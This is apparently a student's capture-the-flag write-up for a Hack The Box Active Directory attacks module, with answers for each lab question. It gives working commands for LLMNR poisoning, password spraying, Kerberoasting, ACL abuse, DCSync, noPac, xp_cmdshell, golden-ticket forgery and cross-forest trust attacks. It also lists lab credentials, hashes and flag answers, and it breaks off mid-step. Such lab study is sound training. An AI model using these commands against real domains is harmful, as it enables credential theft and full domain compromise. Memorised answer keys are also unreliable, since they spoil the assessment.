# HTB-Active_Directory_Enumeration_and_Attacks

## Table of Contents
1. [Initial Enumeration](#initial-enumeration)
    1. [External Recon and Enumeration Principles](#external-recon-and-enumeration-principles)
    2. [Initial Enumeration of the Domain](#initial-enumeration-of-the-domain)
2. [Sniffing out a Foothold](#sniffing-out-a-foothold)
    1. [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
    2. [LLMNR/NBT-NS Poisoning - from Windows](#llmnrnbt-ns-poisoning---from-windows)
3. [Sighting In, Hunting For A User](#sighting-in-hunting-for-a-user)
    1. [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
    2. [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
4. [Spray Responsibly](#spray-responsibly)
    1. [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
    2. [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
5. [Deeper Down the Rabbit Hole](#deeper-down-the-rabbit-hole)
    1. [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
    2. [Credentialed Enumeration - from Windows](#credentialed-enumeration---from-windows)
    3. [Living Off the Land](#living-off-the-land)
6. [Cooking with Fire](#cooking-with-fire)
    1. [Kerberoasting - from Linux](#kerberoasting---from-linux)
    2. [Kerberoasting - from Windows](#kerberoasting---from-windows)
7. [An ACE in the Hole](#an-ace-in-the-hole)
    1. [Access Control List (ACL) Abuse Primer](#access-control-list-acl-abuse-primer)
    2. [ACL Enumeration](#acl-enumeration)
    3. [ACL Abuse Tactics](#acl-abuse-tactics)
    4. [DCSync](#dcsync)
8. [Stacking The Deck](#stacking-the-deck)
    1. [Privileged Access](#privileged-access)
    2. [Bleeding Edge Vulnerabilities](#bleeding-edge-vulnerabilities)
    3. [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
9. [Why So Trusting?](#why-so-trusting)
    1. [Domain Trusts Primer](#domain-trusts-primer)
    2. [Attacking Domain Trusts - Child -> Parent Trusts - from Windows](#attacking-domain-trusts---child---parent-trusts---from-windows)
    3. [Attacking Domain Trusts - Child -> Parent Trusts - from linux](#attacking-domain-trusts---child---parent-trusts---from-linux)
10. [Breaking Down Boundaries](#breaking-down-boundaries)
    1. [Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows](#attacking-domain-trusts---cross-forest-trust-abuse---from-windows)
    2. [Attacking Domain Trusts - Cross-Forest Trust Abuse - from linux](#attacking-domain-trusts---cross-forest-trust-abuse---from-linux)
11. [Defensive Considerations](#defensive-considerations)
    1. [Additional AD Auditing Techniques](#additional-ad-auditing-techniques)
12. [Skill Assessment - Final Showdown](#skill-assessment---final-showdown)
    1. [AD Enumeration & Attacks - Skills Assessment Part I](#ad-enumeration--attacks---skills-assessment-part-i)
    2. [AD Enumeration & Attacks - Skills Assessment Part II](#ad-enumeration--attacks---skills-assessment-part-ii)

## Initial Enumeration
### External Recon and Enumeration Principles
#### Tools
1. [View DNS Info](https://viewdns.info/)
#### Challenges
1. While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )

    We can go to this [wesbite](https://viewdns.info/), choose DNS record section. In there, type `inlanefreight.com`. We can see the answer is `HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}`.

    ![alt text](Assets/ExRecon1.png)

### Initial Enumeration of the Domain
#### Challenges
1. From your scans, what is the "commonName" of host 172.16.5.5 ?

    First we ssh with credential provided and run `nmap` to scan `172.16.5.5`. We can look for the field inside digital certificate to find the answer. The answer is `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`.

    ![alt text](Assets/InEnum1.png)

2. What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)

    If we check with `ifconfig`, we can see `ens224` netwrok interfaces. It is its internal network, so we can do ping sweeping to `172.16.5.0/23`.

    ```bash
    fping -asgq 172.16.5.0/23
    ```
    ![alt text](Assets/InEnum2.png)

    The scan gave us 3 ip results. We can test each of that with nmap to find which host is running `Microsoft SQL Server 2019` service. The answer is `172.16.5.130`.

## Sniffing out a Foothold
### LLMNR/NBT-NS Poisoning - from Linux
#### Tools
1. responder
#### Challenges
1. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

    First we need to ssh with the credential provided. Then we can responder to capture the hash.

    ```bash
    sudo responder -I ens224 
    ```
    After that go to `/usr/share/responder/logs` directory. We will find `SMB-NTLMv2*.txt` file. In there we can find the user that we searched. The answer is `backupagent`.

2. Crack the hash for the previous account and submit the cleartext password as your answer.

    One of the captured hash is like this.

    ```bash
    backupagent::INLANEFREIGHT:7aea7c5d1ba836c8:C4104093906F3BB0B6A5B9A1EC0309A6:010100000000000000083632DA4ADC014380A34FA2FFDCB80000000002000800380037004800460001001E00570049004E002D0033003300360042004C004A003800380046004500320004003400570049004E002D0033003300360042004C004A00380038004600450032002E0038003700480046002E004C004F00430041004C000300140038003700480046002E004C004F00430041004C000500140038003700480046002E004C004F00430041004C000700080000083632DA4ADC0106000400020000000800300030000000000000000000000000300000379D6555F66E3E7DECDC07D73FB639A537E1BF850FED1D146E763E4276C51B320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
    ```
    We can save it and crack it by using hashcat.

    ```bash
    hashcat -m 5600 backupagent_ntlmv2 /usr/share/wordlists/rockyou.txt
    ```
    The answer is `h1backup55`.

3. Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

    We can do exactly like question number 2 but with user `wley`. The answer is `transporter@4`.

### LLMNR/NBT-NS Poisoning - from Windows
#### Tools
1. Inveigh
#### Challenges
1. Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.

    First we need to rdp with provided credential.
    
    ```bash
    xfreerdp /v:10.129.48.82 /u:htb-student /p:Academy_student_AD! /dynamic-resolution
    ```
    Then in the rdp session, go to Tools folder. In there, we can find `inveigh.exe`. After we run it, press `esc` to interact on it. We can type `GET NTLMV2UNIQUE` to get all user with its hash. Then we can use hashcat to crack it. The answer is `security#1`.

## Sighting In, Hunting For A User
### Enumerating & Retrieving Password Policies
#### Tools
1. ldapsearch
#### Challenges
1. What is the default Minimum password length when a new domain is created? (One number)

    We can find this answer from the module.

    ![alt text](Assets/EnumPWDPolicies.png)

    The answer is `7`.

2. What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)

    We can use `ldapsearch` to solve this.
    
    ```bash
    ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 minPwdLength
    ```
    The answer is `8`.

### Password Spraying - Making a Target User List
#### Tools
1. kerbrute
#### Challenges
1. Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

    We can solve this by using `kerbrute`.

    ```bash
    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
    ```
    The answer is `56`.

## Spray Responsibly
### Internal Password Spraying - from Linux
#### Tools
1. kerbrute
2. crackmapexec
#### Challenges
1. Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

    In the previous challenges, we have found all valid user. Then we can save all valid user with the first letter *s* and run `kerbrute`.

    ```bash
    kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_user.txt Welcome1
    ```
    The answer is `sgage`.
### Internal Password Spraying - from Windows
#### Tools
1. DomainPasswordSpray
#### Challenges
1. Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.

    First, we need rdp to the target.

    ```bash
    xfreerdp /v:10.129.138.152 /u:htb-student /p:Academy_student_AD! /dynamic-resolution
    ```
    Then we can use `DomainPasswordSpray` to solve this.

    ```powershell
    Import-Module .\DomainPasswordSpray.ps1
    Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
    ```
    The answer is `dbranch`.

## Deeper Down the Rabbit Hole
### Credentialed Enumeration - from Linux
#### Tools
1. rpclient
2. crackmapexec 
#### Challenges
1. What AD User has a RID equal to Decimal 1170?

    Because we can do SMB null session so We can use `rpclient` to solve this.

    ```bash
    rpcclient -U "" -N 172.16.5.5
    ```
    1170 in decismal is equal to 0x492 in hexadecimal. We can type `enumdomusers` and search user with RID 0x492. The answer is `mmorgan`.

2. What is the membercount: of the "Interns" group?

    We can use `crackmapexec` tool with provided credential in the modul, `forend:Klmcargo2`.

    ```bash
    sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep Interns
    ```
    The answer is `10`.

### Credentialed Enumeration - from Windows
#### Tools
1. bloodhound
2. snaffler
#### Challenges 
1. Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)

    First we need to rdp to the target. Then in there, we can run `sharphound.exe`. It will gather all possible information and compress it in the zip file.

    ```powershell
    .\SharpHound.exe -c All --zipfilename ILFREIGHT
    ```

    After that, we can run `bloodhound`. Then upload the zip file into it. We can go to analysis tab and select `List All Kerberoastable accounts`. 

    ![alt text](Assets/CredEnumWindows1.png)

    The answer is `13`.

2. What PowerView function allows us to test if a user has administrative access to a local or remote host?

    The answer is already in the module. The answer is `Test-AdminAccess`.

3. Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?

    We can solve this by using `snaffler.exe`. 

    ```powershell
    .\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
    ```
    ![alt text](Assets/CredEnumWindows2.png)

    We can see in there, the web config file, its contain user name. The answer is `sa`.

4. What is the password for the database user?

    Based on the previous image, the answer is `ILFREIGHTDB01!`.

### Living Off the Land
#### Challenges
1. Enumerate the host's security configuration information and provide its AMProductVersion.
    
    We can solve this by typing `Get-MpComputerStatus` in the powershell. The answer is `4.18.2109.6`.

2. What domain user is explicitly listed as a member of the local Administrators group on the target host?

    We can solve this by typing `net localgroup administrators` in the powershell. The answer is `adunn`.

3. Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.

    To solve this, we can use dsquery with some filters. It must user account, account disabled, and have administrative privileges. Then it must display username and the description field. 

    ```powershell
    dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr sAMAccountName description
    ```
    The answer is `HTB{LD@P_I$_W1ld} `.

## Cooking with Fire
### Kerberoasting - from Linux
#### Tools
1. GetUserSPNs.py
#### Challenges
1. Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.

    We can use `GetUserSPNs.py` to retrive TGS ticket for SAPService.

    ```bash
    GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile SAPService_tgs
    ```

    ![alt text](Assets/KerberoastingLinux1.png)

    After that, we can use hashcat with mode 13100.

    ```bash
    hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt --force
    ```
    The answer is `!SapperFi2`.

2. What powerful local group on the Domain Controller is the SAPService user a member of?
    
    We can answer this based on the previous image output. The answer is `Account Operators`.

### Kerberoasting - from Windows
#### Tools
1. PowerView.ps1
#### Challenges
1. What is the name of the service account with the SPN 'vmware/inlanefreight.local'?

    First, we can use `PowerView.ps1` to get the list of service account.

    ```powershell
    Import-Module .\PowerView.ps1
    Get-DomainUser * -spn | select samaccountname
    ```

    ![alt text](Assets/KerberoastingWindows1.png)

    Then we can use `PowerView.ps1` to target specific user until we find SPN `vmware/inlanefreight.local`.

    ```powershell
    Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat
    ``` 
    ![alt text](Assets/KerberoastingWindows2.png)

    The answer is `svc_vmwaresso`.

2. Crack the password for this account and submit it as your answer.

    We can save the hash in the previous image. Then we can use hashcat to crack it.

    ```bash
    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `Virtual01`.

## An ACE in the Hole
### Access Control List (ACL) Abuse Primer
#### Challenges
1. What type of ACL defines which security principals are granted or denied access to an object? (one word)

    The answer is `DACL`. Discretionary Access Control List (DACL) defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access.

2. Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?

    The answer is `GenericAll`. tGenericAll grants us full control over a target object.

### ACL Enumeration
#### Tools
1. PowerView
2. bloodhound
#### Challenges
1. What is the rights GUID for User-Force-Change-Password?

    The answer is `00299570-246d-11d0-a768-00aa006e0529`.

2. What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?

    The answer is `ResolveGUIDs`.

3. What privileges does the user damundsen have over the Help Desk Level 1 group?

    The anaswer is `GenericWrite`. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it.

4. Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).

    We can solve this by using bloodhound. First we run `sharphound.exe`.

    ```bash
    .\SharpHound.exe -c All --zipfilename ILFREIGHT
    ```
    Then we run `bloodhound` and upload the zip file in there. After that, click seacrh bar and type `forend`. Select it as starting node. Then type `dpayne` and select it as ending node. 

    ![alt text](Assets/ACLEnumeration1.png)

    The answer is `GenericAll`.

5. What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)

    We can use `PowerView` to solve this. This tells PowerView to only get the permissions list (ACL) for the "GPO Management" group.

    ```powerhsell
    Import-Module .\PowerView.ps1
    $sid = Convert-NameToSid forend
    Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
    ```
    The answer is `Self-Membership`.

### ACL Abuse Tactics
#### Tools
1. PowerView
2. kerberoast
3. hashcat
#### Challenges

1. Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.

    To solve this, we should perform this following attack chain:

        1. Use the wley user to change the password for the damundsen user
        2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
        3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
    
    Here the detail steps:

    1. Use the wley user to change the password for the damundsen user

        In the previous we have already get wley credential, `wley:transporter@4`. We can use that credential to authenticate as wley.

        ```powershell
        $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
        ```

        After that, we can reset damundsen password by using wley credential.

        ```powerhsell
        $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
        Import-Module .\PowerView.ps1
        Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
        ```
    
    2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group

        After We have succesfully reset damundsen password, we can try to authenticate as damundsen.

        ```powershell
        $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
        $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
        ```
        Then we can add damundsen into `Help Desk Level 1` group.

        ```powershell
        Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
        ```

        We can confirm if we have successfully added damundsen into `Help Desk Level 1` group by using this command.

        ```powershell
        Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
        ```
        ![alt text](Assets/ACLAbuseTactics1.png)
    
    3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

        We can get adunn hash by using kerberoast attack. But to perform it, we must have SPN which is not default for user account. SPN by default is for service not regular account. So we need to create fake SPN.

        ```powershell.
        Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
        ```
        Then we can run `kerberoast`.

        ```powershell
        .\Rubeus.exe kerberoast /user:adunn /nowrap
        ```

        ![alt text](Assets/ACLAbuseTactics2.png)

        Then we can copy the hash and crack it by using `hashcat`.

        ```bash
        hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
        ```
        The answer is `SyncMaster757`.

### DCSync
#### Tools
1. secretsdump.py
#### Challenges
1. Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.

    To solve this, after rdp to the target, i do ssh to 172.16.5.225. In there, we can use `secretsdump.py`. Find the `CLEARTEXT` result.

    ```bash
    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 | grep CLEARTEXT
    ```
    ![alt text](Assets/DCSync1.png)

    The answer is `syncron`.

2. What is this user's cleartext password?

    Based on the previous image, the answer is `Mycleart3xtP@ss!`.

3. Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.

    We can use `secretsdump.py` again to solve this.

    ```bash
    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 | grep khartsfield
    ```
    ![alt text](Assets/DCSync2.png)

    The answer is `4bb3b317845f0954200a6b0acc9b9f9a`.

## Stacking The Deck
### Privileged Access
#### Challenges
1. What other user in the domain has CanPSRemote rights to a host?

    We can solve this by using `bloodhound`. After upload the zip file into `bloodhound`, we can use this query.

    ```neo4j
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
    ```
    ![alt text](Assets/PrivilegedAccess1.png)

    The answer is `BDAVIS`.

2. What host can this user access via WinRM? (just the computer name)

    Based on the previous image, the answer is `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`.

3. Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.

    To solve this, we can use linux attack host and use `mssqlclient.py`.

    ```bash
    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
    ```
    Then in the sql session, we can run this.

    ```sql
    SQL> enable_xp_cmdshell
    SQL> RECONFIGURE
    SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
    ```
    The answer is `1m_the_sQl_@dm1n_n0w!`.

### Bleeding Edge Vulnerabilities
#### Tools
1. noPac
2. cube0x0/impacket
3. PetitPotam.py
#### Technique
Here the 3 techniques analogy from the gemini.
1. NoPac (SamAccountName Spoofing)

![alt text](Assets/noPac-Analogy.png)

2. PrintNightmare

![alt text](Assets/printNightmare-Analogy.png)

3. PetitPotam

![alt text](Assets/petiPotam-Analogy.png)

#### Challenges
1. Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)
    
    The answer is `2021-42278&2021-42287`.

2. Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

    We can solve this by using `NoPac`. Firs we need to ensure if its vulnerable or not by using scanner.py from nopac.

    ```bash
    sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
    ```

    ![alt text](<Assets/Bleeding Edge Vulnerabilities1.png>)

    We can see that the scanner successfully authenticated to the Domain Controller and was able to get Kerberos tickets. Now we can use `noPac.py` to perform the exploit.

    ```bash
    sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
    ```
    If it is successful, we will get shell session with system authority. The answer is `D0ntSl@ckonN0P@c!`.

### Miscellaneous Misconfigurations
#### Tools
1. PowerView.ps1
2. rubeus.exe
#### Technique
Here the 5 techniques analogy from the gemini.
1. Exchange & PrivExchange

![alt text](<Assets/Exchange & PrivExchange - Analogy.png>)

2. Printer Bug

![alt text](<Assets/Printer Bug - Analogy.png>)

3. Passwords on Post-it Notes

![alt text](<Assets/Passwords on Post-it Notes - Analogy.png>)

4. ASREPRoasting

![alt text](<Assets/ASREPRoasting - Analogy.png>)

5. GPO Abuse

![alt text](<Assets/GPO Abuse - Analogy.png>)

#### Challenges
1. Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".

    passwd_notreqd means that the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). To solve this, we can use `PowerView.ps1`.

    ```powershell
    Import-Module C:\Tools\PowerView.ps1
    Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
    ```

    The answer is `ygroce`.

2. Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.

    If "Do not require Kerberos pre-authentication setting" enabled, attacker can crack AS-REP hash that hashed with that user password. And we can get that user password. We can solve this by using `PowerView.ps1` again. First we need to find user that  have "Do not require Kerberos pre-authentication setting" enabled.

    ```powershell
    Import-Module C:\Tools\PowerView.ps1
    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
    ```
    ![alt text](<Assets/Miscellaneous Misconfigurations1.png>)

    It leads us to `ygroce` again. Then we can use `rubeus.exe` to perfrom ASREPRoasting to get the hash.

    ```powershell
    C:\Tools\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
    ```

    After we get the hash, we can crack it by using `hashcat` with mode `18200`.

    ```bash
    hashcat -m 18200 crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `Pass@word`.

## Why So Trusting?
### Domain Trusts Primer
#### Tools
1. activedirectory
2. PowerView
3. bloodhound
#### Challenges
1. What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)

    We can solve this by using built in `activedirectory` tool.

    ```powershell
    Import-Module activedirectory
    Get-ADTrust -Filter *
    ```

    ![alt text](<Assets/Domain Trusts Primer 1.png>)

    To identify a child domain, check the `IntraForest` section. If it's set to TRUE, it is a child domain. So the answer is `LOGISTICS.INLANEFREIGHT.LOCAL`.

2. What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?

    Based on the previous image, the answer is `FREIGHTLOGISTICS.LOCAL`.

3. What direction is this trust?

    Both of them have `BiDirectional` trust.

### Attacking Domain Trusts - Child -> Parent Trusts - from Windows
#### Tools
1. mimikatz
2. PowerView
3. Rubeus
#### Technique
To perform this attack after compromising a child domain (ExtraSids Attack), we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.

With this data collected, the attack can be performed with Mimikatz. Here the analogy of this attack from gemini.

1. Step 1: Gather Your Forgery Tools

![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Windows - Step1.png>)

2. Step 2: Forge the Golden Ticket (The Fake Passport)

![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Windows - Step2.png>)

3. Step 3: Use Your Fake Passport

![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Windows - Step3.png>)

#### Challenges

1. What is the SID of the child domain?

    We can use `PowerView` with `Get-DomainSID` function. The answer is `S-1-5-21-2806153819-209893948-922872689`.

2. What is the SID of the Enterprise Admins group in the root domain?

    We can use `PowerView` again to solve this. Here the command of it.

    ```powershell
    Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
    ```
    The answer is `S-1-5-21-3842939050-3880317879-2865463114-519`.

3. Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain

    At this point, we have obtained the SID of the child domain and the SID of the Enterprise Admins group in the root domain. To perform ExtraSids Attack, we also need the krbtgt hash for the child domain. We can use `mimikatz` to get this hash.

    ```powershell
    mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt 
    ```
    We can copy the NTLM hash and use `mimikatz` again to perform ExtraSids Attack.

    ```powershell
    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
    ```
    Once we have the golden ticket, we can retrieve the flag with this command.

    ```powershell
    type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
    ```
    The answer is `f@ll1ng_l1k3_d0m1no3$`.

### Attacking Domain Trusts - Child -> Parent Trusts - from Linux
#### Tools
1. raiseChild.py
#### Challenges
1. Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.

    To get the hash for bross, we first need to gain control of the parent domain. We can use `raiseChild.py` to get the administrator hash.

    ```bash
    /usr/local/bin/raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
    ```

    ![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Linux 1.png>)

    Once we have the administrator hash, we can use `secretsdump.py` to retrieve `bross's` hash.

    ```bash
    secretsdump.py INLANEFREIGHT.LOCAL/administrator@172.16.5.5 -just-dc-user bross -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf
    ```
    The answer is `49a074a39dd0651f647e765c2cc794c7`.

## Breaking Down Boundaries
### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
#### Challenges
1. Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.

    First we need to confirm that mssqlsvc user is present in the FREIGHTLOGISTIC.LOCAL domain.

    ```powershell
    Import-Module .\PowerView.ps1 
    Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
    ```
    Once we confirm it, we can use `Rubeus` to get the hash.

    ```powershell
    .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
    ```
    Then we can use `hashcat` with mode `13100` to crack it.

    ```bash
    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `1logistics`.

### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
#### Challenges
1. Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.

    We can solve this by using `GetUserSPNs.py`.

    ```bash
    GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    ```

    The answer is `sapsso`.

2. Crack the TGS and submit the cleartext password as your answer.

    We can solve this by using `GetUserSPNs.py` again with `-request` flag.

    ```bash
    GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    ```
    Once we have the hash, we can crack it by using `haschat` with mode `13100`.

    ```bash
    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `pabloPICASSO`.

3. Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

    We can login by using `evil-winrm`.

    ```bash
    evil-winrm -i ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -u sapsso -p 'pabloPICASSO'
    ```
    Once we logged in, we can read the flag. The answer is `burn1ng_d0wn_th3_f0rest!`.

## Defensive Considerations
### Additional AD Auditing Techniques
#### Tools
1. PingCastle
2. ADRecon
3. Group3r
4. AD Explorer

Those tools can also used for reconnaissance and enumeration phase of Active Directory.

## Skill Assessment - Final Showdown
### AD Enumeration & Attacks - Skills Assessment Part I
#### Challenges
1. Submit the contents of the flag.txt file on the administrator Desktop of the web server

    The challenge statement indicated that we already have shell access in the upload folder. We can check the `/upload` endpoint. In there we can find `antak.aspx`. It gave us system authority. From there, we can get the flag by typing the following command:

    ```powershell
    type C:\Users\Administrator\Desktop\flag.txt
    ```
    The answer is `JusT_g3tt1ng_st@rt3d!`.

2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer

    We can solve this by using `setspn` command. It will gave us the account name.

    ```powershell
    setspn -Q "MSSQLSvc/SQL01.inlanefreight.local:1433"
    ```
    The answer is `svc_sql`.

3. Crack the account's password. Submit the cleartext value.

    First, we need to download `rubeus` onto our attack machine.

    ```bash
    wget https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/dotnet%20v3.5%20compiled%20binaries/Rubeus.exe
    ```
    Then, we upload the executable to the web server via our web shell. In the antak.aspx shell, we can run Rubeus to perform a Kerberoast attack:

    ```powershell
    C:\Rubeus.exe kerberoast /user:svc_sql /nowrap
    ```
    Once we have the hash, we can crack it by using `hashcat` with mode `13100`.

    ```bash
    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `lucky7`.

4. Submit the contents of the flag.txt file on the Administrator desktop on MS01

    If we check with `setspn`, we will see that WSMAN is enable in the MS01. The WSMAN SPN means that WinRM (PowerShell Remoting) is enabled on MS01.

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 1.png>)

    Based on this, we can use evil-winrm to connect to MS01. However, because MS01 is on an internal network of the challenge IP, we cant connect directly from our attack machine to MS01. We need to set up port forwarding. Pinging the host `ping -n 1 MS01.inlanefreight.local`reveals its IP address is `172.16.6.50`. We can use `netsh` to forward connection from port `5985` to the `172.16.6.50` (MS01 address). So in the antax shell, we use this command:

    ```powershell
